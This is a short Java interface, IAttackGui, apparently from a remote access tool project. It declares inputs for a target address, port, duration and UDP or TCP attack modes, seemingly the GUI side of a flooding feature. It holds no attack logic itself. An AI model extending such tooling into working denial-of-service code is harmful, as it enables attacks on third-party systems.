package de.sogomn.rat.gui;

import static de.sogomn.rat.util.Constants.LANGUAGE;

public interface IAttackGui extends IGui {
	String ADDRESS = LANGUAGE.getString("server.address");
	String PORT = LANGUAGE.getString("server.port");
	String ATTACKUDP = "server.attackudp"; // TODO: LANGUAGE.getString("server.attackudp");
	String ATTACKTCP = "server.attacktcp";
	String DURATION = "Duration";

	void setAddressInput(String input);
	void setPortInput(String input);
	void setDuration(String input);

	String getAddressInput();
	String getPortInput();
	String getDuration();
}
